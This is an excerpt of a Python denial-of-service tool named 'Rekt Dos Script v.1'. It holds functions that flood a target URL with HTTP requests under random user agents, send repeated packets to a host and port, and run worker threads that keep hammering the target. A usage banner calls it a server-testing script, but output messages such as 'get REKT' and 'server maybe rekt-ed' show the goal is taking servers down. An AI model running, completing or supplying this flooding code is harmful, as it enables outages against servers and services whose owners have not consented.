...
def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(headers_useragents)}))
			print("\033[94mbot is bombing...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! get REKT--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe rekt-ed\033[0m")
...
def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(headers_referers)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[92m	Rekt Dos Script v.1 
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	usage : python3 rekt.py [-s] [-p] [-t]
	-h : help
	-s : server ip
	-p : port default 80
